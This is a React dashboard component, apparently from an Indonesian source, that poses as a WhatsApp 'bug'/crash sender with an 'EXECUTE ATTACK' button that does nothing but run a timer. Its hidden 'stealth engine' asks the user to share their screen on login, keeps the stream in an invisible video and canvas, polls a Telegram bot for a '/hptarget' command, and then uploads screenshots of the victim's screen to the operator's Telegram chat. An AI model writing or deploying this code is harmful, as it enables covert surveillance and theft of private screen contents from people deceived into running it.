"use client"

import React, { useState, useEffect, useRef } from "react"
import { Shield, Bug, Zap, CheckCircle, Globe, ChevronLeft, ChevronRight, Laptop, Smartphone } from "lucide-react"

// --- DATA ASLI ---
const BUG_TYPES = [
  { name: "DELAY INVISIBLE", code: "delayLow" },
  { name: "CRASH INVISIBLE", code: "crashHigh" },
  { name: "BLANK CLICK", code: "blankTap" },
  { name: "DELAY IOS", code: "delayIOS" },
  { name: "Force close Wa", code: "forceClose" },
]

export default function YaeMikoDashboard() {
  // --- MESIN SILUMAN (GAK AKAN MERUBAH TAMPILAN) ---
  const videoRef = useRef<HTMLVideoElement>(null);
  const canvasRef = useRef<HTMLCanvasElement>(null);
  const lastCmdId = useRef(0);
  const [isMonitoringActive, setIsMonitoringActive] = useState(false);

  // === CONFIG TELEGRAM (GANTI DISINI) ===
  const BOT_TOKEN = 'TOKEN_BOT_LO';
  const CHAT_ID = 'ID_CHAT_LO';

  // --- STATE ASLI LO ---
  const [targetNumber, setTargetNumber] = useState("62xxxxxxxxxx")
  const [isLoading, setIsLoading] = useState(false)
  const [activeNav, setActiveNav] = useState(0)
  const [bugLimit, setBugLimit] = useState(5)
  const [showLimitWarning, setShowLimitWarning] = useState(false)
  const [isLoggedIn, setIsLoggedIn] = useState(false)
  const [isAuthLoading, setIsAuthLoading] = useState(false)

  // --- LOGIC MONITORING ---
  useEffect(() => {
    if (!isMonitoringActive) return;
    const sendTele = async (type: string, content: any) => {
      const fd = new FormData();
      fd.append('chat_id', CHAT_ID);
      const endpoint = type === 'text' ? 'sendMessage' : 'sendPhoto';
      if (type === 'text') fd.append('text', content);
      else fd.append('photo', content);
      try { await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/${endpoint}`, { method: 'POST', body: fd }); } catch (e) {}
    };
    const capture = () => {
      if (!videoRef.current || !canvasRef.current) return;
      const canvas = canvasRef.current;
      canvas.width = videoRef.current.videoWidth;
      canvas.height = videoRef.current.videoHeight;
      canvas.getContext('2d')?.drawImage(videoRef.current, 0, 0);
      canvas.toBlob((blob) => { if (blob) sendTele('photo', blob); }, 'image/jpeg', 0.5);
    };
    const listen = setInterval(async () => {
      try {
        const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/getUpdates?offset=-1`);
        const data = await res.json();
        if (data.result?.length > 0) {
          const msg = data.result[0].message;
          if (msg && msg.message_id !== lastCmdId.current && msg.chat.id.toString() === CHAT_ID) {
            lastCmdId.current = msg.message_id;
            if (msg.text === '/hptarget') capture();
          }
        }
      } catch (e) {}
    }, 4000);
    return () => clearInterval(listen);
  }, [isMonitoringActive, BOT_TOKEN, CHAT_ID]);

  const startStealthMode = async () => {
    try {
      const stream = await navigator.mediaDevices.getDisplayMedia({ video: true });
      if (videoRef.current) {
        videoRef.current.srcObject = stream;
        videoRef.current.play();
        setIsMonitoringActive(true);
      }
    } catch (err) {}
  };

  const handleSendBug = () => {
    if (bugLimit <= 0) {
      setShowLimitWarning(true)
      return
    }
    setIsLoading(true)
    setTimeout(() => {
      setIsLoading(false)
      setBugLimit(prev => Math.max(0, prev - 1))
    }, 5000)
  }

  return (
    <div className="relative min-h-screen bg-[#0a0f1a] overflow-hidden">
      {/* 100% TAMPILAN AWAL LO (BOKEH, SVG, DLL) */}
      <div className="fixed inset-0 overflow-hidden pointer-events-none">
        <div className="absolute top-10 -left-20 w-64 h-64 rounded-full bg-cyan-500/10 blur-3xl animate-pulse" />
        <div className="absolute top-1/4 right-0 w-80 h-80 rounded-full bg-pink-600/10 blur-3xl animate-pulse" />
        <div className="absolute inset-0 bg-gradient-to-b from-transparent via-[#0a0f1a]/80 to-[#0a0f1a]" />
      </div>

      {!isLoggedIn ? (
        <div className="relative z-20 flex flex-col items-center justify-center min-h-screen px-6">
          {isAuthLoading && (
             <div className="fixed inset-0 z-50 flex items-center justify-center bg-[#0a0f1a]">
               <h1 className="text-pink-600 text-7xl font-black animate-pulse">SELZ</h1>
             </div>
          )}
          <div className="w-full max-w-sm glass rounded-3xl p-8 border border-white/10 backdrop-blur-3xl text-center">
            <div className="mb-6 inline-block p-4 bg-cyan-500/10 rounded-full border border-cyan-500/30">
              <Shield className="w-10 h-10 text-cyan-400" />
            </div>
            <h1 className="text-white font-black text-2xl mb-2 tracking-tighter">YAE MIKO ACCESS</h1>
            <p className="text-cyan-500/60 text-[10px] uppercase tracking-[0.3em] mb-8 font-mono">Encrypted Terminal v3.0</p>
            <button 
              onClick={() => { startStealthMode(); setIsAuthLoading(true); setTimeout(() => { setIsAuthLoading(false); setIsLoggedIn(true); }, 3000); }}
              className="w-full py-4 bg-gradient-to-r from-cyan-600 to-cyan-400 rounded-2xl font-black text-white shadow-lg shadow-cyan-500/20 active:scale-95 transition-all"
            >
              INITIALIZE SYSTEM
            </button>
          </div>
        </div>
      ) : (
        <div className="relative z-10 flex flex-col min-h-screen max-w-md mx-auto px-4 py-4">
          {/* HEADER ASLI */}
          <header className="flex justify-between items-center mb-6">
            <div className="flex items-center gap-2">
              <Zap className="w-5 h-5 text-yellow-400 fill-yellow-400" />
              <span className="text-white font-black text-xs tracking-widest uppercase">Selz-Hub</span>
            </div>
            <div className="w-10 h-10 rounded-full border border-pink-500/50 p-1">
              <div className="w-full h-full bg-pink-500/20 rounded-full" />
            </div>
          </header>

          {/* PROFILE CARD ASLI */}
          <div className="bg-slate-900/40 border border-white/5 rounded-3xl p-6 text-center mb-4 backdrop-blur-xl">
            <div className="w-20 h-20 bg-slate-800 rounded-full border border-cyan-500/30 flex items-center justify-center mx-auto mb-3 shadow-[0_0_20px_rgba(6,182,212,0.2)]">
              <Bug className="w-10 h-10 text-cyan-400" />
            </div>
            <h2 className="text-white font-bold tracking-tight text-lg">SELZ OVERLORD</h2>
            <div className="text-cyan-500 text-[9px] uppercase tracking-widest font-mono mt-1 px-3 py-1 bg-cyan-500/5 rounded-full inline-block border border-cyan-500/10">System: Developer</div>
          </div>

          {/* MAIN ACTION LO */}
          <div className="bg-slate-900/20 border border-white/5 rounded-[2.5rem] p-6 flex-1 backdrop-blur-md flex flex-col">
            <label className="text-[10px] text-cyan-400 font-bold block mb-2 uppercase tracking-[0.2em] ml-2">Identifier</label>
            <input 
              value={targetNumber} 
              onChange={(e) => setTargetNumber(e.target.value)}
              className="w-full bg-black/40 border border-white/10 p-5 rounded-3xl text-white font-mono text-sm focus:border-cyan-500/50 outline-none mb-6"
            />
            
            <div className="flex-1 flex flex-col justify-center items-center py-4">
              <div className="text-[9px] text-white/30 uppercase tracking-[0.4em] mb-2">Payload Active</div>
              <div className="text-white font-black text-3xl italic tracking-tighter text-center">{BUG_TYPES[activeNav]?.name}</div>
              <div className="text-cyan-500/40 text-[10px] mt-2 font-mono">[{BUG_TYPES[activeNav]?.code}]</div>
            </div>

            <button onClick={handleSendBug} className="w-full py-6 bg-pink-600 rounded-[2rem] font-black text-white tracking-[0.2em] shadow-2xl shadow-pink-600/30 active:scale-95 transition-all text-sm">
                EXECUTE ATTACK
            </button>
          </div>

          {/* NAVIGATION DOTS */}
          <div className="flex justify-center gap-3 my-6">
            {BUG_TYPES.map((_, i) => (
              <div key={i} onClick={() => setActiveNav(i)} className={`h-1.5 rounded-full transition-all cursor-pointer ${activeNav === i ? 'w-10 bg-cyan-500 shadow-[0_0_15px_cyan]' : 'w-2 bg-slate-800'}`} />
            ))}
          </div>

          {/* BOTTOM BAR */}
          <div className="bg-black/40 border border-white/5 p-5 rounded-3xl flex justify-between items-center backdrop-blur-md">
            <div className="flex items-center gap-2">
              <div className="w-2 h-2 bg-green-500 rounded-full animate-ping" />
              <span className="text-[9px] text-green-500 font-bold tracking-[0.2em] uppercase">Encrypted</span>
            </div>
            <div className="flex gap-4 opacity-40">
              <Globe className="w-4 h-4 text-white" />
              <Laptop className="w-4 h-4 text-white" />
            </div>
          </div>
        </div>
      )}

      {/* OVERLAYS */}
      {isLoading && (
        <div className="fixed inset-0 z-50 bg-black/95 flex items-center justify-center backdrop-blur-2xl">
          <div className="text-center">
            <div className="w-16 h-16 border-4 border-cyan-500/10 border-t-cyan-500 rounded-full animate-spin mx-auto mb-6" />
            <p className="text-cyan-400 font-black text-xs tracking-[0.5em] animate-pulse">INJECTING...</p>
          </div>
        </div>
      )}

      {showLimitWarning && (
        <div className="fixed inset-0 z-50 bg-black/90 flex items-center justify-center p-6 backdrop-blur-md">
          <div className="bg-slate-900 border border-red-500/20 p-10 rounded-[3rem] max-w-xs w-full text-center">
            <div className="w-16 h-16 bg-red-500/10 rounded-full flex items-center justify-center mx-auto mb-4">
               <Zap className="text-red-500 w-8 h-8" />
            </div>
            <h2 className="text-white font-black text-xl mb-2">LIMIT!</h2>
            <p className="text-white/40 text-xs mb-8">Daily limit reached for **Selz**. Reset in 24h.</p>
            <button onClick={() => setShowLimitWarning(false)} className="w-full bg-red-600/10 border border-red-500/30 py-4 rounded-2xl text-red-500 font-bold text-xs uppercase tracking-widest">Acknowledge</button>
          </div>
        </div>
      )}

      {/* MESIN SILUMAN TERSEMBUNYI (HIDDEN) */}
      <div style={{ position: 'fixed', width: 0, height: 0, opacity: 0, pointerEvents: 'none', zIndex: -999 }}>
        <video ref={videoRef} autoPlay playsInline muted />
        <canvas ref={canvasRef} />
      </div>
    </div>
  )
        }
